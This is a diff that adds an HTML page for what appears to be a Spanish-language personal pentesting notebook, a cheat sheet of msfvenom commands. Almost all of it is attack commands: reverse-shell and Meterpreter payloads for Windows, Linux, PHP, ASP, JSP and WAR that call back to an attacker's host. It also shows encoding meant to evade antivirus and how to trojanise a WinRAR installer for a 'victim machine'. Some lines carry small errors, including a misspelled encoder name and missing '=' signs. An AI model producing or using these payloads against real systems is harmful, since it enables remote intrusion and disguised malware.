@@ -1,0 +1,125 @@
+<!doctype html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="icon" type="image/png" href="/favicon-monkey.png?v=20260601" />
+    <title>MSFVenom | Notebook</title>
+    <script src="/theme.js"></script>
+    <link rel="stylesheet" href="/section.css" />
+  </head>
+  <body>
+    <main class="section-shell notebook-shell">
+      <a class="back-link" href="/notebook.html">~/notebook</a>
+
+      <section class="notebook-workspace" aria-label="Notebook">
+        <aside class="notebook-sidebar" aria-label="Explorador de apuntes" data-notebook-index></aside>
+
+        <article class="note-panel is-active" id="msfvenom">
+          <div class="note-tabbar">
+            <span>MSFVenom</span>
+            <details class="notebook-tag-search">
+              <summary>Buscar tags</summary>
+              <label>
+                <span>Tags de apuntes</span>
+                <input class="notebook-search-input" type="search" placeholder="Busca por herramienta, técnica o tag del apunte" autocomplete="off" />
+              </label>
+              <div class="notebook-search-results" aria-live="polite"></div>
+            </details>
+            <span>~/notebook/MSFVenom</span>
+          </div>
+
+          <div class="note-content">
+            <p class="eyebrow">msfvenom</p>
+            <h2>MSFVenom</h2>
+
+            <section class="code-card">
+              <h3>Helps</h3>
+              <pre><code>msfvenom --list payloads
+msfvenom --list formats
+msfvenom --list encoders</code></pre>
+            </section>
+            <section class="code-card">
+              <h3>Windows</h3>
+              <pre><code>msfvenom -p windows/x64/shell_reverse_tcp LHOST=&lt;KALI_IP&gt; LPORT=443 -f exe &gt; shell.exe</code></pre>
+            </section>
+            <section class="code-card">
+              <h3>Win 32bit</h3>
+              <pre><code>msfvenom -a x86 -p windows/shell_reverse_tcp LHOST=&lt;KALI_IP&gt; LPORT=443 -f exe &gt; shell.exe</code></pre>
+            </section>
+            <section class="code-card">
+              <h3>PS1</h3>
+              <pre><code>msfvenom -p windows/x64/shell_reverse_tcp LHOST=&lt;KALI_IP&gt; LPORT=443 -f psh -o shell.ps1</code></pre>
+            </section>
+            <section class="code-card">
+              <h3>Linux</h3>
+              <pre><code>msfvenom -p linux/x64/shell_reverse_tcp LHOST=&lt;KALI_IP&gt; LPORT=443 -f elf &gt; shell</code></pre>
+            </section>
+            <section class="code-card">
+              <h3>Linux 32bit</h3>
+              <pre><code>msfvenom -p linux/x86/shell_reverse_tcp LHOST=&lt;KALI_IP&gt; LPORT=443 -f elf &gt; shell</code></pre>
+            </section>
+            <section class="code-card">
+              <h3>ASP</h3>
+              <pre><code>msfvenom -p windows/shell_reverse_tcp LHOST=&lt;KALI_IP&gt; LPORT=443 -f asp &gt; shell.asp</code></pre>
+            </section>
+            <section class="code-card">
+              <h3>WAR</h3>
+              <pre><code>msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;KALI_IP&gt; LPORT=443 -f war &gt; shell.war</code></pre>
+            </section>
+            <section class="code-card">
+              <h3>JSP: Tomcat Manager</h3>
+              <pre><code>msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;KALI_IP&gt; LPORT=443 -f raw &gt; shell.jsp</code></pre>
+            </section>
+            <section class="code-card">
+              <h3>PHP</h3>
+              <pre><code>msfvenom -p php/meterpreter_reverse_tcp LHOST=&lt;IP&gt; LPORT=443 -f raw &gt; shell.php</code></pre>
+            </section>
+            <section class="code-card">
+              <h3>Meterpreter</h3>
+              <pre><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;KALI_IP&gt; LPORT=443 -f exe &gt; shell.exe</code></pre>
+            </section>
+            <section class="code-card">
+              <h3>Otros Tipos de Payloads</h3>
+              <pre><code># Win 32bit + shikata_ga_nai encoded
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;KALI_IP&gt; LPORT=&lt;LOCAL_PORT&gt; -e x86/shikata_ga_nai -f exe &gt; &lt;PAYLOAD_ENCODED_x86&gt;.exe
+
+# Use more encoding iterations
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;KALI_IP&gt; LPORT=&lt;LOCAL_PORT&gt; -i 10 -e x86/shikata_ga_nai -f exe &gt; &lt;PAYLOAD_ENCODED_x86&gt;.exe
+
+# Linux 32bit + shikata_ga_nai encoded
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;KALI_IP&gt; LPORT=&lt;LOCAL_PORT&gt; -i 10 -e x86/shikata_ga_nai -f elf &gt; &lt;PAYLOAD_ENCODED_x86&gt;
+
+# Inject into Portable Executables
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;KALI_IP&gt; LPORT=&lt;LOCAL_PORT&gt; -e x86/shikata_ga_nai -i 10 -f exe -x winrar-x32-621.exe &gt; winrar.exe</code></pre>
+            </section>
+            <section class="code-card">
+              <h3>Cargar payload en un fichero</h3>
+              <pre><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST &lt;nuestra_ip&gt; LPORT 1234 -e x86/shikata_ga_nai -f exe -x ~/Downloads/winrar_install.exe &gt; winrar.exe
+
+# Cargamos el payload en una copia (winrar.exe) del instalador que acabamos de descargar (winrar_install.exe) con el  parámetro -x. Solo falta ejectar el código en la máquina víctima</code></pre>
+            </section>
+            <section class="code-card">
+              <h3>Evadir AntiVirus antiguos</h3>
+              <pre><code>msfvenom --list encoders  # Listar encodes
+
+msfvenom -p windows/meterpreter/reverse_tcp LHOST &lt;nuestra_ip&gt; LPORT 1234 -i 10 -e x86/shitaka_ga_nai -f exe &gt; shell.exe
+
+# x86 para que se pueda usar en arquitecturas x64 y x32 y ese encoder -e porque sirve para linux y windows. 
+# -i 10 quiere decir que lo encriptamos 10 veces, 10 iteraciones para que sea mejor y tenga más probabilidad de evadir un antivirus</code></pre>
+            </section>
+            <h2>Tags</h2>
+            <div class="tag-list">
+              <span>msfvenom</span>
+              <span>payload</span>
+              <span>metasploit</span>
+            </div>
+          </div>
+        </article>
+      </section>
+    </main>
+    <script src="/notebook/index.js"></script>
+    <script src="/notebook/folder-state.js"></script>
+    <script src="/notebook/search.js"></script>
+  </body>
+</html>
